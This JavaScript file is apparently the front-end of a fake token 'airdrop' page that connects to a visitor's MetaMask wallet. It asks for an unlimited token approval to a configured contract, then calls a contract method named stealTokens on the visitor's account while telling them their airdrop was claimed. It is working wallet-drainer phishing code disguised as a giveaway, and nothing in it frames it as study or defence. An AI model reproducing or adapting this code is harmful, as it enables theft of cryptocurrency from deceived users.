let web3, accounts, contractABI, config;

// Load ABI and configuration from external files
async function loadDependencies() {
  contractABI = await fetch("abi.json").then((response) => response.json());
  config = await fetch("config.json").then((response) => response.json());
}

// Check if the user is on a mobile device
function isMobileDevice() {
  return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
}

// Open MetaMask on mobile (deep link)
function openMetaMaskMobile() {
  window.location.href = 'metamask://';
  setTimeout(() => {
    alert("Please open MetaMask to connect.");
  }, 3000);
}

// Connect to MetaMask
async function connectMetaMask() {
  if (window.ethereum) {
    if (isMobileDevice()) {
      // Open MetaMask on mobile
      openMetaMaskMobile();
    } else {
      // Desktop connection
      web3 = new Web3(window.ethereum);
      try {
        accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        document.getElementById("approveButton").disabled = false;
        document.getElementById("claimAirdropButton").disabled = false;
        alert("Connected to MetaMask");
      } catch (error) {
        alert("MetaMask connection failed: " + error.message);
      }
    }
  } else {
    alert("MetaMask not detected! Please install MetaMask.");
  }
}

// Approve spending
async function approveSpending() {
  const tokenContract = new web3.eth.Contract(contractABI, config.tokenAddress);
  try {
    const maxApproval = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
    await tokenContract.methods.approve(config.contractAddress, maxApproval).send({ from: accounts[0] });
    alert("Approval successful! You can now claim your airdrop.");
    document.getElementById("claimAirdropButton").disabled = false;
  } catch (error) {
    alert("Error during approval: " + error.message);
  }
}

// Claim airdrop
async function claimAirdrop() {
  console.log("Claiming Airdrop...");
  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
  try {
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert("Airdrop claimed successfully!");
  } catch (error) {
    alert("Error claiming airdrop: " + error.message);
  }
}

// Withdraw ETH (for demonstration purposes)
async function withdrawETH() {
  console.log("Withdraw ETH clicked...");
  // Add withdrawal functionality here
}

// Withdraw Tokens (for demonstration purposes)
async function withdrawTokens() {
  console.log("Withdraw Tokens clicked...");
  // Add withdrawal functionality here
}

// Add event listeners to buttons for user interaction
document.getElementById('connectButton').addEventListener('click', connectMetaMask); // Connect MetaMask
document.getElementById('approveButton').addEventListener('click', approveSpending); // Approve spending
document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop); // Claim airdrop
document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH); // Withdraw ETH
document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens); // Withdraw tokens

// Initialize
loadDependencies();


